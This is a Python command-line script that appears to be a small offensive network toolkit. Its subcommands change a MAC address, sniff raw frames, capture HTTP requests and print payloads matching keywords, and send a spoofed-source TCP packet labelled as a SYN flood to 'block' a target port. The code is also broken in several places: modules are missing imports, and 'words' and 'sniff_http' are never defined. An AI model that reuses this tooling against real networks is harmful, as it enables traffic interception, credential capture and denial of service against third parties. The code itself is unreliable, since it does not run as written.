import argparse
import socket
import struct
from scapy.all import *


def change_mac_address(interface, mac_addr):
    subprocess.run(["ifconfig", interface, "down"])
    subprocess.run(["ifconfig", interface, "hw", "ether", mac_addr])
    subprocess.run(["ifconfig", interface, "up"])


def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_packets)


def process_packets(packet):
    if packet.haslayer(http.HTTPRequest):
        url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
        print(f"URL: {url.decode()}")
        if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load
            for word in words:
                if word in str(load):
                    print(f"Load: {load.decode()}")
                    break


def eth_address(addr):
    ret = ":".join("{:02x}".format(byte) for byte in addr)
    return ret


def packet_sniffer():
    try:
        s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(0x0003))
    except OSError as e:
        print(f"[-] Error creating socket object: {e}")
        exit(1)

    while True:
        packet = s.recvfrom(65535)
        packet = packet[0]

        eth_length = 14
        eth_header = packet[:eth_length]

        eth = struct.unpack("!6s6sH", eth_header)
        eth_protocol = socket.ntohs(eth[2])
        print(
            f"[+] Destination MAC: {eth_address(packet[0:6])} | Source MAC: {eth_address(packet[6:12])} | Protocol: {eth_protocol}"
        )


def syn_flood(src, target, message, dst_port):
    ip_layer = IP(src=src, dst=target)
    tcp_layer = TCP(sport=4444, dport=dst_port)
    raw_layer = Raw(load=message)
    packet = ip_layer / tcp_layer / raw_layer
    send(packet)


def main():
    parser = argparse.ArgumentParser()
    subparsers = parser.add_subparsers(dest="command")

    parser_change_mac = subparsers.add_parser("change_mac")
    parser_change_mac.add_argument(
        "-i", "--interface", type=str, help="Interface to change MAC address of"
    )
    parser_change_mac.add_argument("-m", "--mac", type=str, help="New MAC address")

    parser_sniff = subparsers.add_parser("sniff")
    parser_sniff.add_argument(
        "-i", "--interface", type=str, help="Interface to sniff packets on"
    )

    parser_sniff_http = subparsers.add_parser("sniff_http")
    parser_sniff_http.add_argument(
        "-i", "--interface", type=str, help="Interface to sniff HTTP packets on"
    )

    parser_syn_flood = subparsers.add_parser("syn_flood")
    parser_syn_flood.add_argument(
        "-s", "--src", type=str, help="Source IP address to fake"
    )
    parser_syn_flood.add_argument(
        "-t", "--target", type=str, help="Target's IP address"
    )
    parser_syn_flood.add_argument(
        "-m", "--message", type=str, help="Message for TCP payload"
    )
    parser_syn_flood.add_argument("-p", "--port", type=int, help="Port to block")

    args = parser.parse_args()

    if args.command == "change_mac":
        change_mac_address(args.interface, args.mac)
    elif args.command == "sniff":
        sniff(args.interface)
    elif args.command == "sniff_http":
        sniff_http(args.interface)
    elif args.command == "syn_flood":
        syn_flood(args.src, args.target, args.message, args.port)


if __name__ == "__main__":
    main()
